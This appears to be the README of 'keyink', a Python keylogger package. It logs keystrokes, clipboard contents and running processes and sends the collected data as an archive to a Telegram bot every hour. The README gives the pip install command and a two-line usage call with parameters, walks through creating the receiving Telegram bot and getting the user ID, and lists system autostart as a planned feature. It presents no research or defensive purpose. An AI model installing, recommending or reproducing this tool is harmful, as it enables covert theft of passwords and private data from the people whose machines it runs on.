[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)

# keyink

The keylogger in just 2 lines. Sending to Telegram.

## Description
`keyink` is just starting its development. Its functionality will be expanded in the future.

## Navigation
* [Current features](#Сurrent-features)
* [Future features](#Future-features)
* [Installation](#Installation)
* [Example usage](#Example-usage)
  * [Standard](#Standard)
* [Telegram bot setup](#Telegram-bot-setup)
  * [Getting token](#Getting-token)
  * [Getting id](#Getting-id)

### Current features
1. Logging of keyboard, clipboard, running processes.
2. Sending collected data as an archive to Telegram.
3. Running in a separate thread.

### Future features
1. Adding other loggers.
2. Adding to the system autostart.
 
## Installation

You can install the latest version with the command:
```
pip install keyink==0.0.1
```

## Example usage
### Standard
```python
from keyink.multilogger import Logger

Logger(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
The standard ```Logger``` launches all available loggers and sends the collected data as an archive to you in Telegram every hour.

Transmitted parameters:
* `token` - bot's Telegram token.
* `user_id` - your Telegram id.
* `keyboard` - add keyboard logger (True/False).
* `clipboard` - add a clipboard logger (True/False).
* `processes` - add process logger (True/False).
* `special_keys` - add special keys Enter, Shift, Alt etc. to logs (True/False).
* `pause_iteration` - check frequency of running processes in seconds.
* `sleep` - frequency of sending collected logs in seconds.

## Telegram bot setup
### Getting token
1. Open a chat with [BotFather](https://t.me/botfather).
2. Write the command ```/newbot```.

<p align="left">
  <a href="">
    <img src="_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Write the name of the bot, then the nickname with the attribute ```_bot``` at the end.

<p align="left">
  <a href="">
    <img src="_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Insert the resulting token into the ```YOUR_TOKEN``` field in the script.

### Getting id
1. Open a chat with [Get My ID](https://t.me/getmyid_bot).
2. Write the command ```/start```.

<p align="left">
  <a href="">
    <img src="_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Insert the resulting ID into the ```YOUR_ID``` field in the script.
